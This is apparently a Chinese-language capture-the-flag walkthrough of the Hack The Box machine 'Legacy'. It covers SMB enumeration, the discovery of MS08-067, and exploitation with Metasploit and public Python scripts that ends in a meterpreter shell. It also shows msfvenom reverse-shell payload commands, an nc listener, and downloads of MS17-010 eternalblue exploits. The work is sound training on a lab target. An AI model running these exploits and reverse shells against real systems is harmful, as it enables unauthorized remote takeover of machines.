kali 10.10.16.5

靶机  10.10.10.4



```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```bash
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows XP SP2 or SP3 (96%), Microsoft Windows XP SP3 (96%), Microsoft Windows Server 2003 SP1 or SP2 (94%), Microsoft Windows Server 2003 SP2 (94%), Microsoft Windows Server 2003 SP1 (94%), Microsoft Windows 2003 SP2 (94%), Microsoft Windows XP Professional SP2 or Windows Server 2003 (93%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (93%), Microsoft Windows XP SP2 or SP3, or Windows Embedded Standard 2009 (93%), Microsoft Windows XP SP2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m14s, median: 4d22h57m39s
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-09-11T07:23:11+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b9fd0c (VMware)
```



135：

```bash
└─# python /usr/share/doc/python3-impacket/examples/rpcdump.py -p 135 10.10.10.4
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.10.4
[-] Protocol failed: rpc_s_access_denied
[*] No endpoints found.
```

```bash
└─# rpcclient -U "" -N 10.10.10.4
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> enumprinters
No printers returned.
rpcclient $> querydispinfo
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```



139/445：

```
nmap 10.10.10.4 -p 139,445 --script=smb-enum-shares
```

```
smbmap -H 10.10.10.4
```

```
smbclient -N -L //10.10.10.4
```

失败



再次扫描漏洞 nmap

```bash
└─# nmap $ip -p$ports --script=vuln -oN server-vuln
```

```bash
└─# nmap -p 445 --script vuln 10.10.10.4
```

```bash
└─# nmap -vvv -p 139,445 --script=smb-vuln-* 10.10.10.4
Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
```



```bash
ls /usr/share/nmap/scripts/ | grep smb | grep vuln
nmap --script smb-vuln* -p 445 10.10.10.4
```



得到 ms08-067 再漏洞利用即可，其实也可以试试 ms17-010

https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py



```bash
└─# python exp1.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```





```bash
msf6 > search ms08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set lport 80
lport => 80
msf6 exploit(windows/smb/ms08_067_netapi) > set lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms08_067_netapi) > exploit 

[*] Started reverse TCP handler on 10.10.16.5:80 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 2+ - lang:English
[-] 10.10.10.4:445 - Could not determine the exact service pack
[-] 10.10.10.4:445 - Auto-targeting failed, use 'show targets' to manually select one
[*] Exploit completed, but no session was created.
```

反弹不回来





终于成功

```bash
msf6 exploit(windows/smb/ms08_067_netapi) > show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.10.4       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.5       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   7   Windows XP SP3 English (NX)



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms08_067_netapi) > exploit 

[*] Started reverse TCP handler on 10.10.16.5:4444 
[-] 10.10.10.4:445 - Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_OBJECT_NAME_NOT_FOUND (Command=162 WordCount=0)
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > set target 6
target => 6
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.16.5:4444 
[-] 10.10.10.4:445 - Exploit failed: Rex::Proto::SMB::Exceptions::ErrorCode The server responded with error: STATUS_OBJECT_NAME_NOT_FOUND (Command=162 WordCount=0)
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.16.5:4444 
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.10.10.4:1035) at 2023-09-06 00:32:58 -0400

meterpreter > shell
Process 1748 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

```

```bash
meterpreter > search -f user.txt
Found 1 result...
=================

Path                                             Size (bytes)  Modified (UTC)
----                                             ------------  --------------
c:\Documents and Settings\john\Desktop\user.txt  32            2017-03-16 02:19:49 -0400
```













手动利用

```
手动利用-python版本利用ms08-067
https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
https://github.com/nullarmor/hackthebox-exploits/tree/master/legacy

kali@kali:~/Downloads/htb/legacy$ python ms08-067.py
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################


$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .


#######################################################################


Usage: ms08-067.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

FYI: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1


python ms08-067.py 10.10.10.4 6 445
nc -lvnp 443

可以使用ms17-010漏洞
https://github.com/Johk3/HTB_Walkthrough/tree/master/Legacy
https://github.com/worawit/MS17-010
利用上述MS17-010最好都下载下来，利用里面自带的mysmb模块，如果不下载会显示mysmb模块加载失败
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f exe > exploit.exe
git clone https://github.com/helviojunior/MS17-010.git
cd MS17-010
python send_and_execute.py 10.10.10.4 exploit.exe

手动利用ms17-010
 
wget https://raw.githubusercontent.com/worawit/MS17-010/master/eternalblue_exploit8.py
eternalblue_exploit8.py <ip> <shellcode_file> [numGroomConn]

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.2_443.exe

python eternalblue_exploit8.py 10.10.10.4 rev_10.10.14.2_443.exe
```



这种漏洞一开始利用不成功的话，机器容易坏，要重启
